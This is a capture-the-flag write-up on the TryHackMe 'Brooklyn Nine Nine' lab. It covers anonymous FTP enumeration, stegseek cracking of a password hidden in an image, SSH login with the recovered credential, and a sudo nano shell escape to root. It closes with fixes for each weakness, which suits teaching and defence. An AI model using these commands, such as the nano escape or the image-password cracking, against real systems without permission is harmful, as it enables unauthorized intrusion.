## Summary

Brooklyn Nine Nine is an Easy Linux machine. **Anonymous FTP** exposes a note
hinting at weak credentials, and a comment in the web application points to
**steganography**. A password hidden inside the site's background image is
recovered with `stegseek` and reused to gain SSH access as `holt`. A permissive
**sudo** rule allowing `nano` to run as root is then abused to escalate to
**root**.

## Machine Information

| Name | Difficulty | OS | Platform |
| --- | --- | --- | --- |
| Brooklyn Nine Nine | Easy | Linux | TryHackMe |

## Attack Path

1. Nmap reveals FTP, SSH and HTTP services.
2. Anonymous FTP login is allowed and exposes `note_to_jake.txt`.
3. The note hints at weak credentials for several users.
4. A source-code comment in the web app references steganography.
5. `stegseek` extracts a hidden file from the background image.
6. The extracted file contains the password for `holt`.
7. SSH access is obtained as `holt`.
8. `sudo -l` shows `nano` can be run as root without a password.
9. `nano`'s command-execution feature is abused to spawn a root shell.

## Reconnaissance

Initial service enumeration was performed with **Nmap**.

```bash
nmap -sC -sV -A -T4 10.64.137.31
```

| Port | Service |
| --- | --- |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

Nmap also flagged that the FTP service allowed anonymous authentication:

```
ftp-anon: Anonymous FTP login allowed
```

A file named `note_to_jake.txt` was visible on the FTP share.

## FTP Enumeration

Anonymous FTP allowed the note to be downloaded directly with `wget`.

```bash
wget ftp://anonymous:anonymous@10.64.137.31/note_to_jake.txt
```

The contents read:

```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```

This revealed three useful facts: candidate usernames (**amy**, **jake**,
**holt**), that `jake`'s password is weak, and that `holt` is likely a
privileged user. Rather than brute-forcing SSH, web enumeration continued.

## Web Enumeration

The HTTP service on port 80 was reviewed in the browser. The page source
contained a revealing comment:

```html
<!-- Have you ever heard of steganography? -->
```

The page CSS referenced a background image, `brooklyn99.jpg`, making it the
obvious target for hidden data.

## Steganography

Following the steganography hint, `stegseek` was used against the image with the
`rockyou.txt` wordlist.

```bash
stegseek brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```

`stegseek` recovered the passphrase `admin` and extracted `brooklyn99.jpg.out`,
which contained the password for `holt`:

```
Holt Password:
fluffydog12@ninenine
```

## Initial Access (User)

The recovered credentials authenticated over SSH as `holt`.

```bash
ssh holt@10.64.137.31
```

This provided the initial foothold. The user flag lives at
`/home/holt/user.txt`.

## Privilege Escalation

### Enumeration

`sudo -l` showed that `holt` could run `nano` as any user without a password.

```bash
sudo -l
```

```
User holt may run the following commands on brooklyn_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

### Abusing sudo nano

Editors such as `nano` can spawn commands from within their interface. Running
the editor as root and using its command-execution feature yields a root shell.

```bash
sudo /bin/nano
```

Inside `nano`, the following command was executed via the spawn function:

```
reset; sh 1>&0 2>&0
```

This spawned a shell as root (`uid=0(root)`). The root flag lives at
`/root/root.txt`.

## Vulnerability Analysis

**Anonymous FTP** — the FTP service permitted anonymous login, exposing
`note_to_jake.txt` and leaking usernames and password hints. Fix: disable
anonymous access and restrict FTP to authenticated users.

**Sensitive data hidden in an image** — the web application leaked a
steganography hint, and the background image embedded the password for `holt`.
Fix: never store credentials in static assets, and treat all public files as
disclosed.

**Insecure sudo configuration** — `holt` could run `/bin/nano` as root without a
password, and `nano`'s command-execution feature allowed escaping to a root
shell. Fix: avoid granting sudo on interpreters/editors; restrict sudo to
specific, non-interactive commands.

## Tools Used

- Nmap
- wget
- Stegseek
- John / rockyou.txt
- SSH

## Key Takeaways

- Always check whether anonymous FTP is enabled.
- Files left on exposed services often contain useful hints.
- Source-code comments can reveal the intended exploitation path.
- Steganography is a common way to hide credentials in images.
- Sudo access to editors like `nano` is a critical privilege-escalation vector.
